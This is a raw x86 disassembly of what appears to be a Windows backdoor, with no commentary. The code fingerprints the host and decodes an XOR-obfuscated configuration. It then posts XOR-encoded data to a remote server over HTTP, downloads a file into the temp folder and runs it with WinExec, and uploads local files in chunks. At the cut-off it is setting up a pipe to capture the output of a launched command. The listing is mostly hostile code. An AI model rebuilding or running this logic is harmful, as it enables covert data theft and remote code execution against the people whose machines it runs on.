sub     esp, 0a0h
mov     eax, ___security_cookie
xor     eax, esp
mov     [esp+0a0h+var_4], eax
push    98h
lea     eax, [esp+0a4h+versioninformation.dwmajorversion]
push    0
push    eax
call    _memset
add     esp, 0ch
lea     ecx, [esp+0a0h+versioninformation]
push    ecx
mov     [esp+0a4h+versioninformation.dwosversioninfosize], 9ch
call    ds:getversionexa
test    eax, eax
jnz     short loc_401053
mov     ecx, [esp+0a0h+var_4]
xor     ecx, esp
call    @__security_check_cookie@4
add     esp, 0a0h
retn
mov     eax, [esp+0a0h+versioninformation.dwmajorversion]
cmp     eax, 6
jnz     loc_4010e1
mov     eax, [esp+0a0h+versioninformation.dwminorversion]
test    eax, eax
jnz     short loc_40108c
cmp     [esp+0a0h+var_6], 1
setnz   al
lea     eax, [eax+eax+4]
mov     ecx, [esp+0a0h+var_4]
xor     ecx, esp
call    @__security_check_cookie@4
add     esp, 0a0h
retn
cmp     eax, 1
jnz     short loc_4010b7
xor     eax, eax
cmp     [esp+0a0h+var_6], 1
setnz   al
lea     eax, [eax+eax+5]
mov     ecx, [esp+0a0h+var_4]
xor     ecx, esp
call    @__security_check_cookie@4
add     esp, 0a0h
retn
cmp     eax, 2
jnz     short loc_401131
xor     eax, eax
cmp     [esp+0a0h+var_6], 1
setnz   al
add     eax, 8
mov     ecx, [esp+0a0h+var_4]
xor     ecx, esp
call    @__security_check_cookie@4
add     esp, 0a0h
retn
cmp     eax, 5
jnz     short loc_401131
mov     eax, [esp+0a0h+versioninformation.dwminorversion]
cmp     eax, 2
jnz     short loc_401109
mov     eax, 3
mov     ecx, [esp+0a0h+var_4]
xor     ecx, esp
call    @__security_check_cookie@4
add     esp, 0a0h
retn
cmp     eax, 1
jnz     short loc_401128
mov     eax, 2
mov     ecx, [esp+0a0h+var_4]
xor     ecx, esp
call    @__security_check_cookie@4
add     esp, 0a0h
retn
test    eax, eax
jnz     short loc_401131
mov     eax, 1
mov     ecx, [esp+0a0h+var_4]
xor     ecx, esp
call    @__security_check_cookie@4
add     esp, 0a0h
retn
xor     ecx, ecx
test    esi, esi
jle     short locret_40116b
mov     al, [ecx+edx]
test    al, al
jz      short loc_401166
cmp     al, 56h
jz      short loc_401166
xor     al, 56h
mov     [ecx+edx], al
inc     ecx
cmp     ecx, esi
jl      short loc_401156
retn
sub     esp, 810h
mov     eax, ___security_cookie
xor     eax, esp
mov     [esp+810h+var_4], eax
push    ebx
xor     ebx, ebx
push    3ffh
lea     eax, [esp+818h+var_403]
push    ebx
push    eax
mov     [esp+820h+volumenamebuffer], bl
call    _memset
push    3ffh
lea     ecx, [esp+824h+var_803]
push    ebx
push    ecx
mov     [esp+82ch+volumeserialnumber], ebx
mov     [esp+82ch+maximumcomponentlength], ebx
mov     [esp+82ch+filesystemflags], ebx
mov     [esp+82ch+filesystemnamebuffer], bl
call    _memset
add     esp, 18h
push    400h
lea     edx, [esp+818h+filesystemnamebuffer]
push    edx
lea     eax, [esp+81ch+filesystemflags]
push    eax
lea     ecx, [esp+820h+maximumcomponentlength]
push    ecx
lea     edx, [esp+824h+volumeserialnumber]
push    edx
push    400h
lea     eax, [esp+82ch+volumenamebuffer]
push    eax
push    offset rootpathname
call    ds:getvolumeinformationa
mov     ecx, [esp+814h+var_4]
neg     eax
sbb     eax, eax
and     eax, [esp+814h+volumeserialnumber]
pop     ebx
xor     ecx, esp
call    @__security_check_cookie@4
add     esp, 810h
retn
sub     esp, 18h
mov     eax, ___security_cookie
xor     eax, esp
mov     [esp+18h+var_4], eax
mov     al, byte ptr buffer
push    esi
xor     ecx, ecx
push    edi
test    al, al
jz      short loc_40125f
jmp     short loc_401240
movsx   eax, al
cdq
mov     esi, 1ah
idiv    esi
mov     al, byte ptr (buffer+1)[ecx]
inc     ecx
add     dl, 61h
mov     byte_414773[ecx], dl
test    al, al
jnz     short loc_401240
mov     byte_414774[ecx], 0
call    sub_401170
xor     ecx, ecx
push    eax
lea     eax, [esp+24h+buffer]
push    offset format
push    eax
mov     [esp+2ch+buffer], 0
mov     [esp+2ch+var_17], ecx
mov     [esp+2ch+var_13], ecx
mov     [esp+2ch+var_f], ecx
mov     [esp+2ch+var_b], ecx
mov     [esp+2ch+var_7], cx
mov     [esp+2ch+var_5], cl
call    _sprintf
lea     eax, [esp+2ch+buffer]
add     esp, 0ch
mov     ecx, eax
mov     dl, [eax]
inc     eax
test    dl, dl
jnz     short loc_4012a4
mov     edi, offset byte_414774
sub     eax, ecx
mov     esi, ecx
dec     edi
mov     cl, [edi+1]
inc     edi
test    cl, cl
jnz     short loc_4012b5
mov     ecx, eax
shr     ecx, 2
rep movsd
mov     ecx, eax
and     ecx, 3
rep movsb
mov     ecx, [esp+20h+var_4]
pop     edi
pop     esi
xor     ecx, esp
call    @__security_check_cookie@4
add     esp, 18h
retn
sub     esp, 108h
mov     eax, ___security_cookie
xor     eax, esp
mov     [esp+108h+var_4], eax
push    103h
lea     eax, [esp+10ch+var_107]
push    0
push    eax
mov     [esp+114h+filename], 0
call    _memset
add     esp, 0ch
push    104h
lea     ecx, [esp+10ch+filename]
push    ecx
push    0
call    ds:getmodulefilenamea
test    eax, eax
jnz     short loc_40133a
xor     al, al
mov     ecx, [esp+108h+var_4]
xor     ecx, esp
call    @__security_check_cookie@4
add     esp, 108h
retn
mov     cl, 5ch
lea     esp, [esp+0]
dec     eax
cmp     [esp+eax+108h+filename], cl
jnz     short loc_401340
mov     [esp+eax+108h+var_107], 0
lea     eax, [esp+108h+filename]
dec     eax
nop
mov     cl, [eax+1]
inc     eax
test    cl, cl
jnz     short loc_401350
mov     edx, ds:dword_410478
mov     ecx, ds:dword_41047c
push    edi
mov     [eax], edx
lea     edx, [esp+10ch+filename]
push    offset mode
push    edx
mov     [eax+4], ecx
call    _fopen
mov     edi, eax
add     esp, 8
test    edi, edi
jnz     short loc_40139a
xor     al, al
pop     edi
mov     ecx, [esp+108h+var_4]
xor     ecx, esp
call    @__security_check_cookie@4
add     esp, 108h
retn
push    ebx
push    ebp
push    esi
push    2
push    0
push    edi
call    _fseek
push    edi
call    _ftell
push    0
push    0
push    edi
mov     ebp, eax
call    _fseek
lea     ebx, [ebp+1a4h]
push    ebx
call    _malloc
mov     esi, eax
add     esp, 20h
mov     dword_414760, esi
test    esi, esi
jnz     short loc_4013d8
xor     al, al
jmp     short loc_401403
push    ebp
push    0
push    esi
call    _memset
push    edi
push    1
push    ebp
push    esi
call    _fread
push    edi
call    _fclose
mov     edx, dword_414760
add     esp, 20h
mov     esi, ebx
call    sub_401150
mov     al, 1
mov     ecx, [esp+118h+var_4]
pop     esi
pop     ebp
pop     ebx
pop     edi
xor     ecx, esp
call    @__security_check_cookie@4
add     esp, 108h
retn
push    ecx
cmp     dword_414760, 0
push    esi
push    edi
mov     esi, eax
mov     edi, offset ax9793x59
jnz     short loc_401442
call    sub_4012e0
test    al, al
jnz     short loc_401442
mov     dword_414760, edi
mov     [esp+0ch+nsize], 10h
test    esi, esi
jl      short loc_401475
cmp     esi, 6
jl      short loc_40145b
cmp     dword_414760, edi
jz      short loc_401475
lea     eax, [esp+0ch+nsize]
push    eax
push    offset buffer
call    ds:getcomputernamea
test    eax, eax
jnz     short loc_40147b
call    ds:getlasterror
pop     edi
xor     al, al
pop     esi
pop     ecx
retn
push    ebx
call    sub_401220
imul    esi, 1a4h
add     esi, dword_414760
mov     ebx, esi
cmp     byte ptr [ebx], 0
mov     lpszservername, ebx
jz      loc_401752
push    ebp
push    0fah
push    0
push    offset dword_414460
call    _memset
push    0fah
push    0
push    offset byte_414560
call    _memset
push    0fah
push    0
push    offset dword_414660
call    _memset
mov     ecx, ds:dword_410488
mov     ebp, ds:dword_410484
mov     eax, ebx
mov     dword_414464, ecx
add     esp, 24h
mov     dword_414460, ebp
mov     ecx, eax
mov     dl, [eax]
inc     eax
test    dl, dl
jnz     short loc_4014f1
mov     edi, offset dword_414460
sub     eax, ecx
dec     edi
mov     cl, [edi+1]
inc     edi
test    cl, cl
jnz     short loc_401500
mov     ecx, eax
shr     ecx, 2
rep movsd
mov     ecx, eax
and     ecx, 3
lea     eax, [ebx+32h]
rep movsb
mov     ecx, eax
jmp     short loc_401520
mov     dl, [eax]
inc     eax
test    dl, dl
jnz     short loc_401520
mov     edi, offset dword_414460
sub     eax, ecx
mov     esi, ecx
dec     edi
mov     cl, [edi+1]
inc     edi
test    cl, cl
jnz     short loc_401531
mov     ecx, eax
shr     ecx, 2
rep movsd
mov     ecx, eax
and     ecx, 3
mov     eax, offset byte_414774
rep movsb
mov     ecx, eax
mov     edi, edi
mov     dl, [eax]
inc     eax
test    dl, dl
jnz     short loc_401550
mov     edi, offset dword_414460
sub     eax, ecx
mov     esi, ecx
dec     edi
mov     cl, [edi+1]
inc     edi
test    cl, cl
jnz     short loc_401561
mov     ecx, eax
shr     ecx, 2
rep movsd
mov     ecx, eax
and     ecx, 3
mov     eax, offset dword_414460
rep movsb
dec     eax
lea     ecx, [ecx+0]
mov     cl, [eax+1]
inc     eax
test    cl, cl
jnz     short loc_401580
mov     edx, ds:dword_41048c
mov     ecx, ds:dword_410490
mov     [eax], edx
mov     edx, ds:dword_410494
mov     [eax+4], ecx
mov     cx, ds:word_410498
mov     [eax+8], edx
mov     [eax+0ch], cx
lea     eax, [ebx+64h]
mov     edx, offset byte_414560
sub     edx, eax
mov     cl, [eax]
mov     [edx+eax], cl
inc     eax
test    cl, cl
jnz     short loc_4015b7
mov     edi, offset byte_414560
dec     edi
mov     al, [edi+1]
inc     edi
test    al, al
jnz     short loc_4015c7
mov     dx, ds:word_41049c
lea     eax, [ebx+0c8h]
mov     [edi], dx
mov     ecx, eax
mov     dl, [eax]
inc     eax
test    dl, dl
jnz     short loc_4015e1
mov     edi, offset byte_414560
sub     eax, ecx
mov     esi, ecx
dec     edi
mov     cl, [edi+1]
inc     edi
test    cl, cl
jnz     short loc_4015f2
mov     ecx, eax
shr     ecx, 2
rep movsd
mov     ecx, eax
and     ecx, 3
mov     eax, offset byte_414560
rep movsb
dec     eax
mov     edi, edi
mov     cl, [eax+1]
inc     eax
test    cl, cl
jnz     short loc_401610
mov     ecx, ds:dword_4104a0
mov     edx, ds:dword_4104a4
mov     [eax], ecx
mov     ecx, ds:dword_4104a8
mov     [eax+4], edx
mov     edx, ds:dword_4104ac
mov     [eax+8], ecx
mov     ecx, ds:dword_4104b0
mov     [eax+0ch], edx
mov     dl, ds:byte_4104b4
mov     [eax+10h], ecx
mov     [eax+14h], dl
mov     eax, ds:dword_410488
mov     dword_414664, eax
mov     eax, ebx
mov     dword_414660, ebp
mov     ecx, eax
pop     ebp
mov     dl, [eax]
inc     eax
test    dl, dl
jnz     short loc_401662
mov     edi, offset dword_414660
sub     eax, ecx
mov     esi, ecx
dec     edi
mov     cl, [edi+1]
inc     edi
test    cl, cl
jnz     short loc_401673
mov     ecx, eax
shr     ecx, 2
rep movsd
mov     ecx, eax
and     ecx, 3
lea     eax, [ebx+96h]
rep movsb
mov     ecx, eax
mov     dl, [eax]
inc     eax
test    dl, dl
jnz     short loc_401691
mov     edi, offset dword_414660
sub     eax, ecx
mov     esi, ecx
dec     edi
mov     cl, [edi+1]
inc     edi
test    cl, cl
jnz     short loc_4016a2
mov     ecx, eax
shr     ecx, 2
rep movsd
mov     ecx, eax
and     ecx, 3
mov     eax, offset dword_414660
rep movsb
dec     eax
mov     edi, edi
mov     cl, [eax+1]
inc     eax
test    cl, cl
jnz     short loc_4016c0
mov     ecx, ds:dword_4104b8
mov     edx, ds:dword_4104bc
mov     [eax], ecx
mov     ecx, ds:dword_4104c0
mov     [eax+4], edx
mov     edx, ds:dword_4104c4
mov     [eax+8], ecx
mov     cx, ds:word_4104c8
mov     [eax+0ch], edx
mov     dl, ds:byte_4104ca
mov     [eax+10h], cx
mov     [eax+12h], dl
mov     eax, offset byte_414774
mov     ecx, eax
mov     dl, [eax]
inc     eax
test    dl, dl
jnz     short loc_401706
mov     edi, offset dword_414660
sub     eax, ecx
mov     esi, ecx
dec     edi
mov     cl, [edi+1]
inc     edi
test    cl, cl
jnz     short loc_401717
mov     ecx, eax
shr     ecx, 2
rep movsd
mov     ecx, eax
and     ecx, 3
cmp     hinternet, 0
rep movsb
jnz     short loc_401759
push    0
push    0
push    0
push    0
push    offset szagent
call    ds:internetopena
mov     hinternet, eax
test    eax, eax
jnz     short loc_401759
pop     ebx
pop     edi
xor     al, al
pop     esi
pop     ecx
retn
push    0b00000h
call    _malloc
add     esp, 4
pop     ebx
test    eax, eax
pop     edi
mov     lpbuffer, eax
setnz   al
pop     esi
pop     ecx
retn
push    ebx
push    ebp
mov     ebp, [esp+8+lpmultibytestr]
push    esi
mov     ebx, eax
mov     eax, ebp
push    edi
lea     esi, [eax+1]
nop
mov     cl, [eax]
inc     eax
test    cl, cl
jnz     short loc_401790
sub     eax, esi
lea     edi, [eax+eax+2]
push    edi
call    _malloc
push    edi
mov     esi, eax
push    0
push    esi
call    _memset
mov     edi, ds:multibytetowidechar
add     esp, 10h
push    0
push    esi
push    0ffffffffh
push    ebp
push    0
push    1
call    edi
push    eax
push    esi
push    0ffffffffh
push    ebp
push    0
push    1
call    edi
mov     ebp, ds:widechartomultibyte
push    0
push    0
push    0
push    ebx
push    0ffffffffh
push    esi
push    0
push    0fde9h
call    ebp
mov     edi, eax
push    edi
push    0
push    ebx
call    _memset
add     esp, 0ch
push    0
push    0
push    edi
push    ebx
push    0ffffffffh
push    esi
push    0
push    0fde9h
call    ebp
test    eax, eax
push    esi
setnz   bl
call    _free
add     esp, 4
pop     edi
pop     esi
pop     ebp
mov     al, bl
pop     ebx
retn
push    ebx
push    ebp
push    esi
push    edi
mov     ebx, eax
lea     esi, [eax+1]
lea     esp, [esp+0]
mov     cl, [eax]
inc     eax
test    cl, cl
jnz     short loc_401830
sub     eax, esi
lea     edi, [eax+eax+2]
push    edi
call    _malloc
push    edi
mov     esi, eax
push    0
push    esi
call    _memset
mov     edi, ds:multibytetowidechar
add     esp, 10h
push    0
push    esi
push    0ffffffffh
push    ebx
push    0
push    0fde9h
call    edi
mov     ebp, eax
call    ds:getlasterror
push    ebp
push    esi
push    0ffffffffh
push    ebx
push    0
push    0fde9h
call    edi
mov     ebx, [esp+10h+lpmultibytestr]
mov     edi, ds:widechartomultibyte
push    0
push    0
push    0
push    ebx
push    0ffffffffh
push    esi
push    0
push    1
call    edi
push    0
push    0
push    eax
push    ebx
push    0ffffffffh
push    esi
push    0
push    1
call    edi
test    eax, eax
push    esi
setnz   bl
call    _free
add     esp, 4
pop     edi
pop     esi
pop     ebp
mov     al, bl
pop     ebx
retn
xor     ecx, ecx
test    esi, esi
jle     short locret_4018db
mov     al, [ecx+edx]
test    al, al
jz      short loc_4018d6
cmp     al, 59h
jz      short loc_4018d6
xor     al, 59h
mov     [ecx+edx], al
inc     ecx
cmp     ecx, esi
jl      short loc_4018c6
retn
sub     esp, 8
mov     eax, ___security_cookie
xor     eax, esp
mov     [esp+8+var_4], eax
mov     eax, [esp+8+arg_0]
push    ebx
push    ebp
mov     ebp, [esp+10h+arg_8]
push    esi
push    edi
push    0fah
mov     [esp+1ch+hinternet], eax
mov     esi, ecx
call    _malloc
mov     ebx, eax
add     esp, 4
test    ebx, ebx
jz      loc_401a54
push    0fah
push    0
push    ebx
call    _memset
add     esp, 0ch
call    ds:gettickcount
push    eax
push    ebp
push    esi
push    offset byte_414560
push    ebx
call    _sprintf
mov     edi, [esp+2ch+size]
add     edi, 18h
push    edi
call    _malloc
mov     esi, eax
add     esp, 18h
test    esi, esi
jz      loc_401a45
mov     [esi], ebp
mov     [esi+4], edi
mov     ecx, buffer
mov     [esi+8], ecx
mov     edx, dword_414768
mov     [esi+0ch], edx
mov     eax, dword_41476c
mov     edx, [esp+18h+size]
mov     [esi+10h], eax
mov     ecx, dword ptr byte_414770
mov     eax, [esp+18h+hinternet]
push    edx
mov     [esi+14h], ecx
push    eax
lea     ecx, [esi+18h]
push    ecx
call    _memcpy
add     esp, 0ch
xor     ecx, ecx
test    edi, edi
jle     short loc_4019b5
lea     esp, [esp+0]
mov     al, [ecx+esi]
test    al, al
jz      short loc_4019b0
cmp     al, 59h
jz      short loc_4019b0
xor     al, 59h
mov     [ecx+esi], al
inc     ecx
cmp     ecx, edi
jl      short loc_4019a0
mov     edx, lpszservername
mov     eax, hinternet
push    0
push    0
push    3
push    0
push    0
push    50h
push    edx
push    eax
call    ds:internetconnecta
mov     [esp+18h+hinternet], eax
test    eax, eax
jz      short loc_401a45
push    0
push    100h
push    0
push    0
push    offset szversion
push    ebx
push    offset szverb
push    eax
call    ds:httpopenrequesta
mov     ebp, eax
test    ebp, ebp
jz      short loc_401a49
push    edi
push    esi
push    0
push    0
push    ebp
call    ds:httpsendrequesta
cmp     eax, 1
jnz     short loc_401a49
push    ebx
call    _free
push    esi
call    _free
mov     ecx, [esp+20h+hinternet]
mov     esi, ds:internetclosehandle
add     esp, 8
push    ecx
call    esi
push    ebp
call    esi
pop     edi
pop     esi
pop     ebp
mov     al, 1
pop     ebx
mov     ecx, [esp+8+var_4]
xor     ecx, esp
call    @__security_check_cookie@4
add     esp, 8
retn
mov     ebp, [esp+18h+hinternet]
push    ebx
call    _free
add     esp, 4
jmp     short loc_401a5c
mov     esi, [esp+18h+hinternet]
mov     ebp, [esp+18h+hinternet]
test    esi, esi
jz      short loc_401a69
push    esi
call    _free
add     esp, 4
mov     eax, [esp+18h+hinternet]
mov     esi, ds:internetclosehandle
test    eax, eax
jz      short loc_401a7a
push    eax
call    esi
test    ebp, ebp
jz      short loc_401a81
push    ebp
call    esi
mov     ecx, [esp+18h+var_4]
pop     edi
pop     esi
pop     ebp
pop     ebx
xor     ecx, esp
xor     al, al
call    @__security_check_cookie@4
add     esp, 8
retn
sub     esp, 134h
mov     eax, ___security_cookie
xor     eax, esp
mov     [esp+134h+var_4], eax
push    esi
push    12bh
lea     eax, [esp+13ch+var_12f]
push    0
push    eax
mov     [esp+144h+szurl], 0
call    _memset
add     esp, 0ch
call    ds:gettickcount
push    eax
lea     ecx, [esp+13ch+szurl]
push    offset dword_414660
push    ecx
call    _sprintf
mov     eax, hinternet
add     esp, 0ch
push    0
push    100h
push    0
push    0
lea     edx, [esp+148h+szurl]
push    edx
push    eax
call    ds:internetopenurla
mov     esi, eax
test    esi, esi
jz      short loc_401b5a
mov     edx, lpbuffer
push    ebx
lea     ecx, [esp+13ch+dwnumberofbytesread]
push    ecx
push    0b00000h
push    edx
push    esi
mov     [esp+14ch+dwnumberofbytesread], 0
call    ds:internetreadfile
test    eax, eax
push    esi
setnz   bl
call    ds:internetclosehandle
test    bl, bl
pop     ebx
jz      short loc_401b5a
cmp     [esp+138h+dwnumberofbytesread], 0
jz      short loc_401b5a
mov     al, 1
pop     esi
mov     ecx, [esp+134h+var_4]
xor     ecx, esp
call    @__security_check_cookie@4
add     esp, 134h
retn
mov     ecx, [esp+138h+var_4]
pop     esi
xor     ecx, esp
xor     al, al
call    @__security_check_cookie@4
add     esp, 134h
retn
sub     esp, 134h
mov     eax, ___security_cookie
xor     eax, esp
mov     [esp+134h+var_4], eax
push    ebp
push    12bh
lea     eax, [esp+13ch+var_12f]
push    0
push    eax
mov     [esp+144h+szurl], 0
call    _memset
add     esp, 0ch
call    ds:gettickcount
push    eax
lea     ecx, [esp+13ch+szurl]
push    offset dword_414460
push    ecx
call    _sprintf
mov     eax, hinternet
add     esp, 0ch
push    0
push    100h
push    0
push    0
lea     edx, [esp+148h+szurl]
push    edx
push    eax
call    ds:internetopenurla
mov     ebp, eax
test    ebp, ebp
jnz     short loc_401bff
pop     ebp
mov     ecx, [esp+134h+var_4]
xor     ecx, esp
call    @__security_check_cookie@4
add     esp, 134h
retn
push    esi
mov     esi, lpbuffer
push    0b00000h
push    0
push    esi
call    _memset
add     esp, 0ch
lea     ecx, [esp+13ch+dwnumberofbytesread]
push    ecx
push    0b00000h
push    esi
push    ebp
mov     [esp+14ch+dwnumberofbytesread], 0
call    ds:internetreadfile
test    eax, eax
jz      short loc_401c3c
mov     eax, [esp+13ch+dwnumberofbytesread]
test    eax, eax
jnz     short loc_401c6d
push    ebp
call    ds:internetclosehandle
mov     eax, [esp+13ch+dwnumberofbytesread]
test    eax, eax
jz      short loc_401c54
push    eax
call    _free
add     esp, 4
pop     esi
xor     eax, eax
pop     ebp
mov     ecx, [esp+134h+var_4]
xor     ecx, esp
call    @__security_check_cookie@4
add     esp, 134h
retn
push    edi
push    eax
call    _malloc
mov     esi, [esp+144h+dwnumberofbytesread]
mov     edx, lpbuffer
push    esi
mov     edi, eax
push    edx
push    edi
call    _memcpy
add     esp, 10h
mov     edx, edi
call    sub_4018c0
push    ebp
mov     [ebx], esi
call    ds:internetclosehandle
call    sub_401aa0
mov     ecx, [esp+140h+var_4]
mov     eax, edi
pop     edi
pop     esi
pop     ebp
xor     ecx, esp
call    @__security_check_cookie@4
add     esp, 134h
retn
sub     esp, 10ch
mov     eax, ___security_cookie
xor     eax, esp
mov     [esp+10ch+var_4], eax
mov     eax, [esp+10ch+arg_0]
cmp     byte ptr [eax+10h], 0
push    ebx
lea     ebx, [eax+10h]
mov     [esp+110h+var_10c], ebx
jz      short loc_401d01
xor     al, al
pop     ebx
mov     ecx, [esp+10ch+var_4]
xor     ecx, esp
call    @__security_check_cookie@4
add     esp, 10ch
retn
push    esi
push    edi
push    103h
lea     eax, [esp+11ch+var_107]
push    0
push    eax
mov     [esp+124h+buffer], 0
call    _memset
add     esp, 0ch
lea     ecx, [esp+118h+buffer]
push    ecx
push    104h
call    ds:gettemppatha
lea     esi, [esp+118h+buffer]
lea     ecx, [esi+1]
mov     al, [esi]
inc     esi
test    al, al
jnz     short loc_401d33
sub     esi, ecx
lea     edi, [esi+6]
cmp     esi, edi
jge     short loc_401d70
mov     ebx, ds:gettickcount
push    ebp
mov     ebp, ds:sleep
call    ebx
xor     edx, edx
mov     ecx, 1ah
div     ecx
push    1
add     dl, 61h
mov     [esp+esi+120h+buffer], dl
call    ebp
inc     esi
cmp     esi, edi
jl      short loc_401d50
mov     ebx, [esp+11ch+var_10c]
pop     ebp
lea     eax, [esp+118h+buffer]
pop     edi
dec     eax
pop     esi
mov     cl, [eax+1]
inc     eax
test    cl, cl
jnz     short loc_401d77
mov     edx, ds:dword_4104ec
mov     cl, ds:byte_4104f0
mov     [eax], edx
mov     [eax+4], cl
lea     eax, [esp+110h+buffer]
mov     edx, ebx
mov     ecx, eax
sub     edx, ecx
lea     ebx, [ebx+0]
mov     cl, [eax]
mov     [edx+eax], cl
inc     eax
test    cl, cl
jnz     short loc_401da0
mov     ecx, [esp+110h+var_4]
pop     ebx
xor     ecx, esp
mov     al, 1
call    @__security_check_cookie@4
add     esp, 10ch
retn
push    ecx
push    ebx
push    edi
push    esi
call    sub_401cc0
lea     edi, [esi+10h]
mov     bl, al
push    edi
mov     eax, edi
call    sub_401820
add     esp, 8
cmp     dword ptr [esi], 1
jz      short loc_401df8
mov     eax, hobject
cmp     eax, 0ffffffffh
jnz     short loc_401e1b
push    0
push    80h
push    1
push    0
push    0
push    40000000h
push    edi
call    ds:createfilea
mov     hobject, eax
cmp     eax, 0ffffffffh
jz      short loc_401e70
mov     ecx, [esi+8]
push    0
push    0
push    ecx
push    eax
call    ds:setfilepointer
cmp     eax, 0ffffffffh
jz      short loc_401e5a
mov     eax, [esi+0ch]
push    0
lea     edx, [esp+10h+numberofbyteswritten]
push    edx
mov     edx, hobject
push    eax
lea     ecx, [esi+114h]
push    ecx
push    edx
mov     [esp+20h+numberofbyteswritten], 0
call    ds:writefile
test    eax, eax
jnz     short loc_401e76
mov     eax, hobject
push    eax
call    ds:closehandle
mov     hobject, 0ffffffffh
pop     edi
xor     al, al
pop     ebx
pop     ecx
retn
cmp     dword ptr [esi], 3
jnz     short loc_401e9f
mov     ecx, hobject
push    ecx
call    ds:closehandle
mov     hobject, 0ffffffffh
test    bl, bl
jz      short loc_401e9f
push    0
push    edi
call    ds:winexec
pop     edi
mov     al, 1
pop     ebx
pop     ecx
retn
mov     eax, edi
lea     edx, [eax+1]
mov     cl, [eax]
inc     eax
test    cl, cl
jnz     short loc_401eb5
sub     eax, edx
mov     ecx, eax
test    ecx, ecx
jle     short loc_401ecf
cmp     byte ptr [eax+edi], 5ch
jz      short loc_401ecf
dec     eax
test    eax, eax
jg      short loc_401ec4
cmp     eax, ecx
jge     short locret_401eed
push    esi
mov     esi, [esp+4+arg_0]
sub     esi, eax
lea     ebx, [ebx+0]
mov     dl, [edi+eax+1]
mov     [esi+eax], dl
inc     eax
cmp     eax, ecx
jl      short loc_401ee0
pop     esi
retn
sub     esp, 214h
mov     eax, ___security_cookie
xor     eax, esp
mov     [esp+214h+var_4], eax
push    ebp
push    edi
push    0
push    80h
push    3
push    0
push    1
mov     edi, ecx
push    80000000h
push    edi
call    ds:createfilea
mov     ebp, eax
mov     [esp+21ch+hfile], ebp
cmp     ebp, 0ffffffffh
jz      loc_4020cf
push    ebx
push    esi
push    0
push    0
push    0
push    ebp
call    ds:setfilepointer
cmp     eax, 0ffffffffh
jz      loc_4020aa
push    0
push    ebp
call    ds:getfilesize
mov     ebx, eax
cmp     ebx, 0ffffffffh
jz      loc_4020aa
test    ebx, ebx
jz      loc_4020aa
push    4
push    1000h
push    19400h
push    0
call    ds:virtualalloc
mov     esi, eax
test    esi, esi
jz      loc_4020b4
xor     ebp, ebp
push    19400h
push    0
push    esi
call    _memset
mov     eax, [esp+230h+hfile]
add     esp, 0ch
push    0
push    0
push    ebp
push    eax
call    ds:setfilepointer
cmp     eax, 0ffffffffh
jz      loc_4020b0
mov     eax, [esp+224h+hfile]
push    0
lea     ecx, [esp+228h+numberofbytesread]
push    ecx
push    19000h
lea     edx, [esi+114h]
push    edx
push    eax
mov     [esp+238h+numberofbytesread], 0
call    ds:readfile
test    eax, eax
jz      loc_4020cd
mov     ecx, [esp+224h+numberofbytesread]
lea     eax, [esi+10h]
push    edi
mov     [esi+0ch], ecx
mov     [esi+8], ebp
mov     dword ptr [esi], 2
mov     [esi+4], ebx
call    sub_401780
push    103h
lea     edx, [esp+22ch+var_20b]
push    0
push    edx
mov     [esp+234h+var_20c], 0
call    _memset
push    103h
lea     eax, [esp+238h+var_107]
push    0
push    eax
mov     [esp+240h+buffer], 0
call    _memset
lea     ecx, [esp+240h+var_20c]
push    ecx
call    sub_401eb0
push    offset byte_414774
lea     edx, [esp+248h+var_20c]
push    edx
mov     eax, 51eb851fh
mul     ebx
shr     edx, 0fh
inc     edx
push    edx
mov     eax, 51eb851fh
mul     ebp
shr     edx, 0fh
inc     edx
push    edx
lea     eax, [esp+254h+buffer]
push    offset adofdforsons
push    eax
call    _sprintf
mov     ecx, [esp+25ch+numberofbytesread]
add     ecx, 114h
push    3
push    ecx
push    esi
lea     ecx, [esp+268h+buffer]
call    sub_4018e0
add     esp, 44h
push    1f4h
call    ds:sleep
add     ebp, 19000h
cmp     ebp, ebx
jbe     loc_401f84
mov     edx, [esp+224h+hfile]
push    edx
call    ds:closehandle
jmp     short loc_4020bf
mov     esi, [esp+224h+numberofbytesread]
jmp     short loc_4020b4
mov     ebp, [esp+224h+hfile]
push    ebp
call    ds:closehandle
test    esi, esi
jz      short loc_4020cd
push    8000h
push    0
push    esi
call    ds:virtualfree
pop     esi
pop     ebx
mov     ecx, [esp+21ch+var_4]
pop     edi
pop     ebp
xor     ecx, esp
xor     al, al
call    @__security_check_cookie@4
add     esp, 214h
retn
sub     esp, 484h
mov     eax, ___security_cookie
xor     eax, esp
mov     [esp+484h+var_8], eax
push    ebx
push    ebp
push    esi
mov     esi, ecx
push    edi
push    esi
mov     eax, esi
call    sub_401820
add     esp, 4
xor     eax, eax
mov     [esp+494h+pipeattributes.binherithandle], eax
xor     ebp, ebp
push    ebp
mov     [esp+498h+pipeattributes.lpsecuritydescriptor], eax
lea     eax, [esp+498h+pipeattributes]
push    eax
lea     ecx, [esp+49ch+hwritepipe]
push    ecx
lea     edx, [esp+4a0h+hreadpipe]
push    edx
mov     [esp+4a4h+pipeattributes.binherithandle], 1
mov     [esp+4a4h+pipeattributes.nlength], 0ch
call    ds:createpipe
test    eax, eax
jnz     short loc_402152
xor     al, al
jmp     loc_402327
push    40h
lea     eax, [esp+498h+startupinfo.lpreserved]
push    ebp
push    eax
mov     [esp+4a0h+startupinfo.cb], ebp
call    _memset
add     esp, 0ch
lea     ecx, [esp+494h+startupinfo]
push    ecx
call    ds:getstartupinfoa
mov     eax, [esp+494h+hwritepipe]
push    400h
mov     [esp+498h+startupinfo.hstderror], eax
mov     [esp+498h+startupinfo.hstdoutput], eax
xor     eax, eax
lea     edx, [esp+498h+commandline]
push    ebp
push    edx
mov     [esp+4a0h+startupinfo.dwflags], 101h
mov     [esp+4a0h+processinformation.hprocess], ebp
mov     [esp+4a0h+processinformation.hthread], eax
mov     [esp+4a0h+processinformation.dwprocessid], eax
mov     [esp+4a0h+processinformation.dwthreadid], eax
call    _memset
mov     eax, ds:dword_41053c
mov     ecx, ds:dword_410540
mov     edx, ds:dword_410544
mov     dword ptr [esp+4a0h+commandline], eax
mov     eax, esi
mov     [esp+4a0h+var_408], ecx
add     esp, 0ch
mov     [esp+494h+var_404], edx
mov     ecx, eax
lea     ecx, [ecx+0]
mov     dl, [eax]
inc     eax
test    dl, dl
jnz     short loc_4021e0
lea     edi, [esp+494h+commandline]
sub     eax, ecx
dec     edi
mov     cl, [edi+1]
inc     edi
test    cl, cl
jnz     short loc_4021f1
mov     ecx, eax
shr     ecx, 2
rep movsd
mov     ecx, eax
and     ecx, 3
lea     eax, [esp+494h+var_404+3]
rep movsb
lea     edx, [eax+1]
mov     cl, [eax]
inc     eax
test    cl, cl
jnz     short loc_402211
